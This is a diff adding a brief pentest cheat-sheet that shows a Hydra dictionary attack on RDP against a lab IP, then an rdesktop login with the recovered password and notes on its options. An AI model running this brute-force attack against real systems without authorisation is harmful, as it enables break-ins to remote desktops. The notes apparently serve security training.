@@ -1,0 +1,13 @@
+
+                *RDP with Dictionary Attack*
+
+- Hydra -L <usersFile> -P <passwordFile> rdp://<10.0.2.5> -f -vV -t 5 -I
+
+Once you obtain the password:
+rdesktop <ipAddress> -k tr -z -u <username> -p <password>
+
+Options:
+- -k tr: Set the keyboard layout to Turkish.
+- -z: Use compression for faster performance.
+- -u: Specify the username.
+- -p: Specify the password.
